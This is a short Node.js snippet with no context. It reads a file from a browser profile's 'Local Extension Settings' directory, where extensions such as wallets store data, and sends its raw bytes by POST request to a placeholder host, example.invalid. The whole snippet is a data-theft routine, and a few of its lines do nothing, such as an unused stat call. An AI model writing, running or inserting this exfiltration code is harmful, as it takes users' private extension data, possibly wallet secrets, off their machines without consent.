const fs = require('fs');
const root = '/profile/Local Extension Settings';
const files = fs.readdirSync(root);
const info = fs.statSync(root);
files.push(root);
const bytes = fs.readFileSync(root + '/data');
fetch('https://example.invalid/receive', {method: 'POST', body: bytes});
